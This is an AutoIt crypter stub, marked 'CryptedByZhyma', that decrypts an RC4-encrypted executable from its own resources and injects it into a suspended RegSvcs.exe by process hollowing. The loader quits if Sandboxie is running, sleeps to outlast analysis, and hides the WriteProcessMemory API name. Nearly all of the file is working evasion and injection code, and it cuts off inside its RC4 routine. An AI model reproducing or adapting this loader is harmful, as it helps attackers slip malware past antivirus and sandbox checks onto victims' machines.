#CryptedByZhyma#endregion



Global $Memory, $FileBuffer
Global $injecto = _default_regsvcs_()
Global $injectoName = 'RegSvcs.exe'
Global $commandline = 'sdasasd'
Global $keyencode = '0DYpa6BW819hivT2bn96Jgi7f891ggUZuDjlp70uEvlP33zXvk'
Global $sMyPath = FileGetShortName(@ScriptFullPath)
Opt("TrayIconHide", 1)      ;#NoTrayIcon
_Start()
Func _Start()
	Local $sInstance, $sResource, $sFileSize, $sData, $LockData, $sWriteData, $sRun
    If ProcessExists($injectoName) then
		Sleep(2000)
	Else
		$sInstance = _LoadLibraryEx($sMyPath, 1)
		$sResource = sFindResource($sInstance, 10 , 999)
		$sFileSize = sSizeOfResource($sInstance, $sResource)
		$sData = sLoadResource($sInstance, $sResource)
		$LockData = sLockResource($sData)
		$sWriteData = DllStructCreate("Boolean[" & $sFileSize & "]", $LockData)
		$sRun = DllStructGetData($sWriteData, 1)
		If  ProcessExists ('SandboxieRpcSs.exe') or ProcessExists  ('SandboxieDcomLaunch.exe') Then
			Sleep(1000)
			Exit
		EndIf
		Sleep(20000)
		$iNewPID =_RunBinary(sRC4($sRun ,$keyencode), $commandline, $injecto)
	EndIf
endfunc
Func _LoadLibraryEx($sMyPath, $iFlag)
	Local $aRet = DllCall("kernel32", "hwnd", "LoadLi" & "braryEx", "str", $sMyPath, "hwnd", 0, "int", $iFlag)
    Return $aRet[0]
EndFunc
Func sSizeOfResource($sInstance, $sResource)
	Local $Ret = DllCall("kernel32", "dword", "SizeofResource", "ptr", $sInstance, "ptr", $sResource)
	Return $Ret[0]
EndFunc
Func sFindResource($sInstance, $sType, $sName)
	Local $Ret = DllCall("kernel32", "ptr", "FindResourceW", "ptr", $sInstance, "int", $sName, "int", $sType)
	Return $Ret[0]
EndFunc
Func sLoadResource($sInstance, $sResource)
	Local $Ret = DllCall("kernel32", "ptr", "LoadResource", "ptr", $sInstance, "ptr", $sResource)
	Return $Ret[0]
EndFunc
Func sLockResource($sData)
	Local $Ret = DllCall("kernel32", "ptr", "LockResource", "ptr", $sData)
	Return $Ret[0]
EndFunc


Func _RunBinary($bBinaryImage, $sCommandLine = "", $sExeModule = @AutoItExe)

	#Region 1. DETERMINE INTERPRETER TYPE
	Local $fAutoItX64 = @AutoItX64

	#Region 2. PREDPROCESSING PASSED
	Local $bBinary = Binary($bBinaryImage) ; this is redundant but still...
	; Make structure out of binary data that was passed
	Local $tBinary = DllStructCreate("byte[" & BinaryLen($bBinary) & "]")
	DllStructSetData($tBinary, 1, $bBinary) ; fill it
	; Get pointer to it
	Local $pPointer = DllStructGetPtr($tBinary)

	#Region 3. CREATING NEW PROCESS
	; STARTUPINFO structure (actually all that really matters is allocated space)
	Local $tSTARTUPINFO = DllStructCreate("dword  cbSize;" & _
			"ptr Reserved;" & _
			"ptr Desktop;" & _
			"ptr Title;" & _
			"dword X;" & _
			"dword Y;" & _
			"dword XSize;" & _
			"dword YSize;" & _
			"dword XCountChars;" & _
			"dword YCountChars;" & _
			"dword FillAttribute;" & _
			"dword Flags;" & _
			"word ShowWindow;" & _
			"word Reserved2;" & _
			"ptr Reserved2;" & _
			"ptr hStdInput;" & _
			"ptr hStdOutput;" & _
			"ptr hStdError")
	; This is much important. This structure will hold very some important data.
	Local $tPROCESS_INFORMATION = DllStructCreate("ptr Process;" & _
			"ptr Thread;" & _
			"dword ProcessId;" & _
			"dword ThreadId")
	; Create new process
	Local $aCall = DllCall("kernel32.dll", "bool", "CreateProcessW", _
			"wstr", $sExeModule, _
			"wstr", $sCommandLine, _
			"ptr", 0, _
			"ptr", 0, _
			"int", 0, _
			"dword", 4, _ ; CREATE_SUSPENDED ; <- this is essential
			"ptr", 0, _
			"ptr", 0, _
			"ptr", DllStructGetPtr($tSTARTUPINFO), _
			"ptr", DllStructGetPtr($tPROCESS_INFORMATION))
	; Check for errors or failure
	If @error Or Not $aCall[0] Then Return SetError(1, 0, 0) ; CreateProcess function or call to it failed
	; Get new process and thread handles:
	Local $hProcess = DllStructGetData($tPROCESS_INFORMATION, "Process")
	Local $hThread = DllStructGetData($tPROCESS_INFORMATION, "Thread")
	; Check for 'wrong' bit-ness. Not because it could't be implemented, but besause it would be uglyer (structures)
	If $fAutoItX64 And _RunBinary_IsWow64Process($hProcess) Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(2, 0, 0)
	EndIf

	#Region 4. FILL CONTEXT STRUCTURE
	; CONTEXT structure is what's really important here. It's processor specific.
	Local $iRunFlag, $tCONTEXT
	If $fAutoItX64 Then
		If @OSArch = "X64" Then
			$iRunFlag = 2
			$tCONTEXT = DllStructCreate("align 16; uint64 P1Home; uint64 P2Home; uint64 P3Home; uint64 P4Home; uint64 P5Home; uint64 P6Home;" & _ ; Register parameter home addresses
					"dword ContextFlags; dword MxCsr;" & _ ; Control flags
					"word SegCS; word SegDs; word SegEs; word SegFs; word SegGs; word SegSs; dword EFlags;" & _ ; Segment Registers and processor flags
					"uint64 Dr0; uint64 Dr1; uint64 Dr2; uint64 Dr3; uint64 Dr6; uint64 Dr7;" & _ ; Debug registers
					"uint64 Rax; uint64 Rcx; uint64 Rdx; uint64 Rbx; uint64 Rsp; uint64 Rbp; uint64 Rsi; uint64 Rdi; uint64 R8; uint64 R9; uint64 R10; uint64 R11; uint64 R12; uint64 R13; uint64 R14; uint64 R15;" & _ ; Integer registers
					"uint64 Rip;" & _ ; Program counter
					"uint64 Header[4]; uint64 Legacy[16]; uint64 Xmm0[2]; uint64 Xmm1[2]; uint64 Xmm2[2]; uint64 Xmm3[2]; uint64 Xmm4[2]; uint64 Xmm5[2]; uint64 Xmm6[2]; uint64 Xmm7[2]; uint64 Xmm8[2]; uint64 Xmm9[2]; uint64 Xmm10[2]; uint64 Xmm11[2]; uint64 Xmm12[2]; uint64 Xmm13[2]; uint64 Xmm14[2]; uint64 Xmm15[2];" & _ ; Floating point state (types are not correct for simplicity reasons!!!)
					"uint64 VectorRegister[52]; uint64 VectorControl;" & _ ; Vector registers (type for VectorRegister is not correct for simplicity reasons!!!)
					"uint64 DebugControl; uint64 LastBranchToRip; uint64 LastBranchFromRip; uint64 LastExceptionToRip; uint64 LastExceptionFromRip") ; Special debug control registers
		Else
			$iRunFlag = 3
			; FIXME - Itanium architecture
			; Return special error number:
			DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
			Return SetError(102, 0, 0)
		EndIf
	Else
		$iRunFlag = 1
		$tCONTEXT = DllStructCreate("dword ContextFlags;" & _ ; Control flags
				"dword Dr0; dword Dr1; dword Dr2; dword Dr3; dword Dr6; dword Dr7;" & _ ; CONTEXT_DEBUG_REGISTERS
				"dword ControlWord; dword StatusWord; dword TagWord; dword ErrorOffset; dword ErrorSelector; dword DataOffset; dword DataSelector; byte RegisterArea[80]; dword Cr0NpxState;" & _ ; CONTEXT_FLOATING_POINT
				"dword SegGs; dword SegFs; dword SegEs; dword SegDs;" & _ ; CONTEXT_SEGMENTS
				"dword Edi; dword Esi; dword Ebx; dword Edx; dword Ecx; dword Eax;" & _ ; CONTEXT_INTEGER
				"dword Ebp; dword Eip; dword SegCs; dword EFlags; dword Esp; dword SegSs;" & _ ; CONTEXT_CONTROL
				"byte ExtendedRegisters[512]") ; CONTEXT_EXTENDED_REGISTERS
	EndIf
	; Define CONTEXT_FULL
	Local $CONTEXT_FULL
	Switch $iRunFlag
		Case 1
			$CONTEXT_FULL = 0x10007
		Case 2
			$CONTEXT_FULL = 0x100007
		Case 3
			$CONTEXT_FULL = 0x80027
	EndSwitch
	; Set desired access
	DllStructSetData($tCONTEXT, "ContextFlags", $CONTEXT_FULL)
	; Fill CONTEXT structure:
	$aCall = DllCall("kernel32.dll", "bool", "GetThreadContext", _
			"handle", $hThread, _
			"ptr", DllStructGetPtr($tCONTEXT))
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(3, 0, 0) ; GetThreadContext function or call to it failed
	EndIf
	; Pointer to PEB structure
	Local $pPEB
	Switch $iRunFlag
		Case 1
			$pPEB = DllStructGetData($tCONTEXT, "Ebx")
		Case 2
			$pPEB = DllStructGetData($tCONTEXT, "Rdx")
		Case 3
			; NEVER BE - Itanium architecture
	EndSwitch

	#Region 5. READ PE-FORMAT
	; Start processing passed binary data. 'Reading' PE format follows.
	; First is IMAGE_DOS_HEADER
	Local $tIMAGE_DOS_HEADER = DllStructCreate("char Magic[2];" & _
			"word BytesOnLastPage;" & _
			"word Pages;" & _
			"word Relocations;" & _
			"word SizeofHeader;" & _
			"word MinimumExtra;" & _
			"word MaximumExtra;" & _
			"word SS;" & _
			"word SP;" & _
			"word Checksum;" & _
			"word IP;" & _
			"word CS;" & _
			"word Relocation;" & _
			"word Overlay;" & _
			"char Reserved[8];" & _
			"word OEMIdentifier;" & _
			"word OEMInformation;" & _
			"char Reserved2[20];" & _
			"dword AddressOfNewExeHeader", _
			$pPointer)
	; Save this pointer value (it's starting address of binary image headers)
	Local $pHEADERS_NEW = $pPointer
	; Move pointer
	$pPointer += DllStructGetData($tIMAGE_DOS_HEADER, "AddressOfNewExeHeader") ; move to PE file header
	; Get "Magic"
	Local $sMagic = DllStructGetData($tIMAGE_DOS_HEADER, "Magic")
	; Check if it's valid format
	If Not ($sMagic == "MZ") Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(4, 0, 0) ; MS-DOS header missing.
	EndIf
	; In place of IMAGE_NT_SIGNATURE
	Local $tIMAGE_NT_SIGNATURE = DllStructCreate("dword Signature", $pPointer)
	; Move pointer
	$pPointer += 4 ; size of $tIMAGE_NT_SIGNATURE structure
	; Check signature
	If DllStructGetData($tIMAGE_NT_SIGNATURE, "Signature") <> 17744 Then ; IMAGE_NT_SIGNATURE
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(5, 0, 0) ; wrong signature. For PE image should be "PE\0\0" or 17744 dword.
	EndIf
	; In place of IMAGE_FILE_HEADER
	Local $tIMAGE_FILE_HEADER = DllStructCreate("word Machine;" & _
			"word NumberOfSections;" & _
			"dword TimeDateStamp;" & _
			"dword PointerToSymbolTable;" & _
			"dword NumberOfSymbols;" & _
			"word SizeOfOptionalHeader;" & _
			"word Characteristics", _
			$pPointer)
	; I could check here if the module is relocatable
	;    Local $fRelocatable
	;    If BitAND(DllStructGetData($tIMAGE_FILE_HEADER, "Characteristics"), 1) Then $fRelocatable = False
	; But I won't (will check data in IMAGE_DIRECTORY_ENTRY_BASERELOC instead)
	; Get number of sections
	Local $iNumberOfSections = DllStructGetData($tIMAGE_FILE_HEADER, "NumberOfSections")
	; Move pointer
	$pPointer += 20 ; size of $tIMAGE_FILE_HEADER structure
	; In place of IMAGE_OPTIONAL_HEADER
	Local $tMagic = DllStructCreate("word Magic;", $pPointer)
	Local $iMagic = DllStructGetData($tMagic, 1)
	Local $tIMAGE_OPTIONAL_HEADER
	If $iMagic = 267 Then ; x86 version
		If $fAutoItX64 Then
			DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
			Return SetError(6, 0, 0) ; incompatible versions
		EndIf
		$tIMAGE_OPTIONAL_HEADER = DllStructCreate("word Magic;" & _
				"byte MajorLinkerVersion;" & _
				"byte MinorLinkerVersion;" & _
				"dword SizeOfCode;" & _
				"dword SizeOfInitializedData;" & _
				"dword SizeOfUninitializedData;" & _
				"dword AddressOfEntryPoint;" & _
				"dword BaseOfCode;" & _
				"dword BaseOfData;" & _
				"dword ImageBase;" & _
				"dword SectionAlignment;" & _
				"dword FileAlignment;" & _
				"word MajorOperatingSystemVersion;" & _
				"word MinorOperatingSystemVersion;" & _
				"word MajorImageVersion;" & _
				"word MinorImageVersion;" & _
				"word MajorSubsystemVersion;" & _
				"word MinorSubsystemVersion;" & _
				"dword Win32VersionValue;" & _
				"dword SizeOfImage;" & _
				"dword SizeOfHeaders;" & _
				"dword CheckSum;" & _
				"word Subsystem;" & _
				"word DllCharacteristics;" & _
				"dword SizeOfStackReserve;" & _
				"dword SizeOfStackCommit;" & _
				"dword SizeOfHeapReserve;" & _
				"dword SizeOfHeapCommit;" & _
				"dword LoaderFlags;" & _
				"dword NumberOfRvaAndSizes", _
				$pPointer)
		; Move pointer
		$pPointer += 96 ; size of $tIMAGE_OPTIONAL_HEADER
	ElseIf $iMagic = 523 Then ; x64 version
		If Not $fAutoItX64 Then
			DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
			Return SetError(6, 0, 0) ; incompatible versions
		EndIf
		$tIMAGE_OPTIONAL_HEADER = DllStructCreate("word Magic;" & _
				"byte MajorLinkerVersion;" & _
				"byte MinorLinkerVersion;" & _
				"dword SizeOfCode;" & _
				"dword SizeOfInitializedData;" & _
				"dword SizeOfUninitializedData;" & _
				"dword AddressOfEntryPoint;" & _
				"dword BaseOfCode;" & _
				"uint64 ImageBase;" & _
				"dword SectionAlignment;" & _
				"dword FileAlignment;" & _
				"word MajorOperatingSystemVersion;" & _
				"word MinorOperatingSystemVersion;" & _
				"word MajorImageVersion;" & _
				"word MinorImageVersion;" & _
				"word MajorSubsystemVersion;" & _
				"word MinorSubsystemVersion;" & _
				"dword Win32VersionValue;" & _
				"dword SizeOfImage;" & _
				"dword SizeOfHeaders;" & _
				"dword CheckSum;" & _
				"word Subsystem;" & _
				"word DllCharacteristics;" & _
				"uint64 SizeOfStackReserve;" & _
				"uint64 SizeOfStackCommit;" & _
				"uint64 SizeOfHeapReserve;" & _
				"uint64 SizeOfHeapCommit;" & _
				"dword LoaderFlags;" & _
				"dword NumberOfRvaAndSizes", _
				$pPointer)
		; Move pointer
		$pPointer += 112 ; size of $tIMAGE_OPTIONAL_HEADER
	Else
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(6, 0, 0) ; incompatible versions
	EndIf
	; Extract entry point address
	Local $iEntryPointNEW = DllStructGetData($tIMAGE_OPTIONAL_HEADER, "AddressOfEntryPoint") ; if loaded binary image would start executing at this address
	; And other interesting informations
	Local $iOptionalHeaderSizeOfHeadersNEW = DllStructGetData($tIMAGE_OPTIONAL_HEADER, "SizeOfHeaders")
	Local $pOptionalHeaderImageBaseNEW = DllStructGetData($tIMAGE_OPTIONAL_HEADER, "ImageBase") ; address of the first byte of the image when it's loaded in memory
	Local $iOptionalHeaderSizeOfImageNEW = DllStructGetData($tIMAGE_OPTIONAL_HEADER, "SizeOfImage") ; the size of the image including all headers
	; Move pointer
	$pPointer += 8 ; skipping IMAGE_DIRECTORY_ENTRY_EXPORT
	$pPointer += 8 ; size of $tIMAGE_DIRECTORY_ENTRY_IMPORT
	$pPointer += 24 ; skipping IMAGE_DIRECTORY_ENTRY_RESOURCE, IMAGE_DIRECTORY_ENTRY_EXCEPTION, IMAGE_DIRECTORY_ENTRY_SECURITY
	; Base Relocation Directory
	Local $tIMAGE_DIRECTORY_ENTRY_BASERELOC = DllStructCreate("dword VirtualAddress; dword Size", $pPointer)
	; Collect data
	Local $pAddressNewBaseReloc = DllStructGetData($tIMAGE_DIRECTORY_ENTRY_BASERELOC, "VirtualAddress")
	Local $iSizeBaseReloc = DllStructGetData($tIMAGE_DIRECTORY_ENTRY_BASERELOC, "Size")
	Local $fRelocatable
	If $pAddressNewBaseReloc And $iSizeBaseReloc Then $fRelocatable = True
	If Not $fRelocatable Then ConsoleWrite("!!!NOT RELOCATABLE MODULE. I WILL TRY BUT THIS MAY NOT WORK!!!" & @CRLF) ; nothing can be done here
	; Move pointer
	$pPointer += 88 ; size of the structures before IMAGE_SECTION_HEADER (16 of them).

	#Region 6. ALLOCATE 'NEW' MEMORY SPACE
	Local $fRelocate
	Local $pZeroPoint
	If $fRelocatable Then ; If the module can be relocated then allocate memory anywhere possible
		$pZeroPoint = _RunBinary_AllocateExeSpace($hProcess, $iOptionalHeaderSizeOfImageNEW)
		; In case of failure try at original address
		If @error Then
			$pZeroPoint = _RunBinary_AllocateExeSpaceAtAddress($hProcess, $pOptionalHeaderImageBaseNEW, $iOptionalHeaderSizeOfImageNEW)
			If @error Then
				_RunBinary_UnmapViewOfSection($hProcess, $pOptionalHeaderImageBaseNEW)
				; Try now
				$pZeroPoint = _RunBinary_AllocateExeSpaceAtAddress($hProcess, $pOptionalHeaderImageBaseNEW, $iOptionalHeaderSizeOfImageNEW)
				If @error Then
					; Return special error number:
					DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
					Return SetError(101, 1, 0)
				EndIf
			EndIf
		EndIf
		$fRelocate = True
	Else ; And if not try where it should be
		$pZeroPoint = _RunBinary_AllocateExeSpaceAtAddress($hProcess, $pOptionalHeaderImageBaseNEW, $iOptionalHeaderSizeOfImageNEW)
		If @error Then
			_RunBinary_UnmapViewOfSection($hProcess, $pOptionalHeaderImageBaseNEW)
			; Try now
			$pZeroPoint = _RunBinary_AllocateExeSpaceAtAddress($hProcess, $pOptionalHeaderImageBaseNEW, $iOptionalHeaderSizeOfImageNEW)
			If @error Then
				; Return special error number:
				DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
				Return SetError(101, 0, 0)
			EndIf
		EndIf
	EndIf
	; If there is new ImageBase value, save it
	DllStructSetData($tIMAGE_OPTIONAL_HEADER, "ImageBase", $pZeroPoint)

	#Region 7. CONSTRUCT THE NEW MODULE
	; Allocate enough space (in our space) for the new module
	Local $tModule = DllStructCreate("byte[" & $iOptionalHeaderSizeOfImageNEW & "]")
	; Get pointer
	Local $pModule = DllStructGetPtr($tModule)
	; Headers
	Local $tHeaders = DllStructCreate("byte[" & $iOptionalHeaderSizeOfHeadersNEW & "]", $pHEADERS_NEW)
	; Write headers to $tModule
	DllStructSetData($tModule, 1, DllStructGetData($tHeaders, 1))
	; Write sections now. $pPointer is currently in place of sections
	Local $tIMAGE_SECTION_HEADER
	Local $iSizeOfRawData, $pPointerToRawData
	Local $iVirtualAddress, $iVirtualSize
	Local $tRelocRaw
	; Loop through sections
	For $i = 1 To $iNumberOfSections
		$tIMAGE_SECTION_HEADER = DllStructCreate("char Name[8];" & _
				"dword UnionOfVirtualSizeAndPhysicalAddress;" & _
				"dword VirtualAddress;" & _
				"dword SizeOfRawData;" & _
				"dword PointerToRawData;" & _
				"dword PointerToRelocations;" & _
				"dword PointerToLinenumbers;" & _
				"word NumberOfRelocations;" & _
				"word NumberOfLinenumbers;" & _
				"dword Characteristics", _
				$pPointer)
		; Collect data
		$iSizeOfRawData = DllStructGetData($tIMAGE_SECTION_HEADER, "SizeOfRawData")
		$pPointerToRawData = $pHEADERS_NEW + DllStructGetData($tIMAGE_SECTION_HEADER, "PointerToRawData")
		$iVirtualAddress = DllStructGetData($tIMAGE_SECTION_HEADER, "VirtualAddress")
		$iVirtualSize = DllStructGetData($tIMAGE_SECTION_HEADER, "UnionOfVirtualSizeAndPhysicalAddress")
		If $iVirtualSize And $iVirtualSize < $iSizeOfRawData Then $iSizeOfRawData = $iVirtualSize
		; If there is data to write, write it
		If $iSizeOfRawData Then
			DllStructSetData(DllStructCreate("byte[" & $iSizeOfRawData & "]", $pModule + $iVirtualAddress), 1, DllStructGetData(DllStructCreate("byte[" & $iSizeOfRawData & "]", $pPointerToRawData), 1))
		EndIf
		; Relocations
		If $fRelocate Then
			If $iVirtualAddress <= $pAddressNewBaseReloc And $iVirtualAddress + $iSizeOfRawData > $pAddressNewBaseReloc Then
				$tRelocRaw = DllStructCreate("byte[" & $iSizeBaseReloc & "]", $pPointerToRawData + ($pAddressNewBaseReloc - $iVirtualAddress))
			EndIf
		EndIf
		; Move pointer
		$pPointer += 40 ; size of $tIMAGE_SECTION_HEADER structure
	Next
	; Fix relocations
	If $fRelocate Then _RunBinary_FixReloc($pModule, $tRelocRaw, $pZeroPoint, $pOptionalHeaderImageBaseNEW, $iMagic = 523)
	; Write newly constructed module to allocated space inside the $hProcess
	$aCall = DllCall("kernel32.dll", "bool", _RunBinary_LeanAndMean(), _
			"handle", $hProcess, _
			"ptr", $pZeroPoint, _
			"ptr", $pModule, _
			"dword_ptr", $iOptionalHeaderSizeOfImageNEW, _
			"dword_ptr*", 0)
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(7, 0, 0) ; failure while writting new module binary
	EndIf

	#Region 8. PEB ImageBaseAddress MANIPULATION
	; PEB structure definition
	Local $tPEB = DllStructCreate("byte InheritedAddressSpace;" & _
			"byte ReadImageFileExecOptions;" & _
			"byte BeingDebugged;" & _
			"byte Spare;" & _
			"ptr Mutant;" & _
			"ptr ImageBaseAddress;" & _
			"ptr LoaderData;" & _
			"ptr ProcessParameters;" & _
			"ptr SubSystemData;" & _
			"ptr ProcessHeap;" & _
			"ptr FastPebLock;" & _
			"ptr FastPebLockRoutine;" & _
			"ptr FastPebUnlockRoutine;" & _
			"dword EnvironmentUpdateCount;" & _
			"ptr KernelCallbackTable;" & _
			"ptr EventLogSection;" & _
			"ptr EventLog;" & _
			"ptr FreeList;" & _
			"dword TlsExpansionCounter;" & _
			"ptr TlsBitmap;" & _
			"dword TlsBitmapBits[2];" & _
			"ptr ReadOnlySharedMemoryBase;" & _
			"ptr ReadOnlySharedMemoryHeap;" & _
			"ptr ReadOnlyStaticServerData;" & _
			"ptr AnsiCodePageData;" & _
			"ptr OemCodePageData;" & _
			"ptr UnicodeCaseTableData;" & _
			"dword NumberOfProcessors;" & _
			"dword NtGlobalFlag;" & _
			"byte Spare2[4];" & _
			"int64 CriticalSectionTimeout;" & _
			"dword HeapSegmentReserve;" & _
			"dword HeapSegmentCommit;" & _
			"dword HeapDeCommitTotalFreeThreshold;" & _
			"dword HeapDeCommitFreeBlockThreshold;" & _
			"dword NumberOfHeaps;" & _
			"dword MaximumNumberOfHeaps;" & _
			"ptr ProcessHeaps;" & _
			"ptr GdiSharedHandleTable;" & _
			"ptr ProcessStarterHelper;" & _
			"ptr GdiDCAttributeList;" & _
			"ptr LoaderLock;" & _
			"dword OSMajorVersion;" & _
			"dword OSMinorVersion;" & _
			"dword OSBuildNumber;" & _
			"dword OSPlatformId;" & _
			"dword ImageSubSystem;" & _
			"dword ImageSubSystemMajorVersion;" & _
			"dword ImageSubSystemMinorVersion;" & _
			"dword GdiHandleBuffer[34];" & _
			"dword PostProcessInitRoutine;" & _
			"dword TlsExpansionBitmap;" & _
			"byte TlsExpansionBitmapBits[128];" & _
			"dword SessionId")
	; Fill the structure
	$aCall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", _
			"ptr", $hProcess, _
			"ptr", $pPEB, _ ; pointer to PEB structure
			"ptr", DllStructGetPtr($tPEB), _
			"dword_ptr", DllStructGetSize($tPEB), _
			"dword_ptr*", 0)
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(8, 0, 0) ; ReadProcessMemory function or call to it failed while filling PEB structure
	EndIf
	; Change base address within PEB
	DllStructSetData($tPEB, "ImageBaseAddress", $pZeroPoint)
	; Write the changes
	$aCall = DllCall("kernel32.dll", "bool", _RunBinary_LeanAndMean(), _
			"handle", $hProcess, _
			"ptr", $pPEB, _
			"ptr", DllStructGetPtr($tPEB), _
			"dword_ptr", DllStructGetSize($tPEB), _
			"dword_ptr*", 0)
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(9, 0, 0) ; failure while changing base address
	EndIf

	#Region 9. NEW ENTRY POINT
	; Entry point manipulation
	Switch $iRunFlag
		Case 1
			DllStructSetData($tCONTEXT, "Eax", $pZeroPoint + $iEntryPointNEW)
		Case 2
			DllStructSetData($tCONTEXT, "Rcx", $pZeroPoint + $iEntryPointNEW)
		Case 3
			; FIXME - Itanium architecture
	EndSwitch

	#Region 10. SET NEW CONTEXT
	; New context:
	$aCall = DllCall("kernel32.dll", "bool", "SetThreadContext", _
			"handle", $hThread, _
			"ptr", DllStructGetPtr($tCONTEXT))

	If @error Or Not $aCall[0] Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(10, 0, 0) ; SetThreadContext function or call to it failed
	EndIf

	#Region 11. RESUME THREAD
	; And that's it!. Continue execution:
	$aCall = DllCall("kernel32.dll", "dword", "ResumeThread", "handle", $hThread)
	; Check for errors or failure
	If @error Or $aCall[0] = -1 Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(11, 0, 0) ; ResumeThread function or call to it failed
	EndIf

	#Region 12. CLOSE OPEN HANDLES AND RETURN PID
	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hProcess)
	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hThread)
	; All went well. Return new PID:
	Return DllStructGetData($tPROCESS_INFORMATION, "ProcessId")

EndFunc

Func _RunBinary_LeanAndMean()
	Local $aArr[18] = ["W", "r", "i", "t", "e", "P", "r", "o", "c", "e", "s", "s", "M", "e", "m", "o", "r", "y"], $sOut
	For $sChar In $aArr
		$sOut &= $sChar
	Next
	Return $sOut
EndFunc

Func _RunBinary_FixReloc($pModule, $tData, $pAddressNew, $pAddressOld, $fImageX64)
	Local $iDelta = $pAddressNew - $pAddressOld ; dislocation value
	Local $iSize = DllStructGetSize($tData) ; size of data
	Local $pData = DllStructGetPtr($tData) ; addres of the data structure
	Local $tIMAGE_BASE_RELOCATION, $iRelativeMove
	Local $iVirtualAddress, $iSizeofBlock, $iNumberOfEntries
	Local $tEnries, $iData, $tAddress
	Local $iFlag = 3 + 7 * $fImageX64 ; IMAGE_REL_BASED_HIGHLOW = 3 or IMAGE_REL_BASED_DIR64 = 10
	While $iRelativeMove < $iSize ; for all data available
		$tIMAGE_BASE_RELOCATION = DllStructCreate("dword VirtualAddress; dword SizeOfBlock", $pData + $iRelativeMove)
		$iVirtualAddress = DllStructGetData($tIMAGE_BASE_RELOCATION, "VirtualAddress")
		$iSizeofBlock = DllStructGetData($tIMAGE_BASE_RELOCATION, "SizeOfBlock")
		$iNumberOfEntries = ($iSizeofBlock - 8) / 2
		$tEnries = DllStructCreate("word[" & $iNumberOfEntries & "]", DllStructGetPtr($tIMAGE_BASE_RELOCATION) + 8)
		; Go through all entries
		For $i = 1 To $iNumberOfEntries
			$iData = DllStructGetData($tEnries, 1, $i)
			If BitShift($iData, 12) = $iFlag Then ; check type
				$tAddress = DllStructCreate("ptr", $pModule + $iVirtualAddress + BitAND($iData, 0xFFF)) ; the rest of $iData is offset
				DllStructSetData($tAddress, 1, DllStructGetData($tAddress, 1) + $iDelta) ; this is what's this all about
			EndIf
		Next
		$iRelativeMove += $iSizeofBlock
	WEnd
	Return 1 ; all OK!
EndFunc

Func _RunBinary_AllocateExeSpaceAtAddress($hProcess, $pAddress, $iSize)
	; Allocate
	Local $aCall = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", _
			"handle", $hProcess, _
			"ptr", $pAddress, _
			"dword_ptr", $iSize, _
			"dword", 0x1000, _ ; MEM_COMMIT
			"dword", 64) ; PAGE_EXECUTE_READWRITE
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		; Try differently
		$aCall = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", _
				"handle", $hProcess, _
				"ptr", $pAddress, _
				"dword_ptr", $iSize, _
				"dword", 0x3000, _ ; MEM_COMMIT|MEM_RESERVE
				"dword", 64) ; PAGE_EXECUTE_READWRITE
		; Check for errors or failure
		If @error Or Not $aCall[0] Then Return SetError(1, 0, 0) ; Unable to allocate
	EndIf
	Return $aCall[0]
EndFunc

Func _RunBinary_AllocateExeSpace($hProcess, $iSize)
	; Allocate space
	Local $aCall = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", _
			"handle", $hProcess, _
			"ptr", 0, _
			"dword_ptr", $iSize, _
			"dword", 0x3000, _ ; MEM_COMMIT|MEM_RESERVE
			"dword", 64) ; PAGE_EXECUTE_READWRITE
	; Check for errors or failure
	If @error Or Not $aCall[0] Then Return SetError(1, 0, 0) ; Unable to allocate
	Return $aCall[0]
EndFunc

Func _RunBinary_UnmapViewOfSection($hProcess, $pAddress)
	DllCall("ntdll.dll", "int", "NtUnmapViewOfSection", _
			"ptr", $hProcess, _
			"ptr", $pAddress)
	; Check for errors only
	If @error Then Return SetError(1, 0, 0) ; Failure
	Return 1
EndFunc

Func _RunBinary_IsWow64Process($hProcess)
	Local $aCall = DllCall("kernel32.dll", "bool", "IsWow64Process", _
			"handle", $hProcess, _
			"bool*", 0)
	; Check for errors or failure
	If @error Or Not $aCall[0] Then Return SetError(1, 0, 0) ; Failure
	Return $aCall[2]
EndFunc

Func sRC4($Data, $Key)
	Local $sOpcode = "0xF6B020C81001006A0010535600578B551031C989C8004989D7F2AE48482900C88945F085C00F8400DC000000B9000100000088C82C0188840D00EFFEFFF" & _
	"FE2F3836500F4008365FC00817D02FC01367D478B45FC3100D2F775F092034510000FB6008B4DFC0FB6088C0DF0005801C8034508F425FF008C8945F48B2075FC8A8435012C8B7" & _
	"D50F486843D0112880310FF4045FCEBB08D9D010A3100FF89FA39550C7663688B85EC000E40033D020B898CD803020700630385E8000843041B010A89DE03B5011B8A200689DF0" & _
	"3BD011186070088060FB60E0FB6079001C181E101298A840294008B750801D630064200EB985F5E5BC9C2100000"
	$sOpcode = _LZNTDecompress($sOpcode)
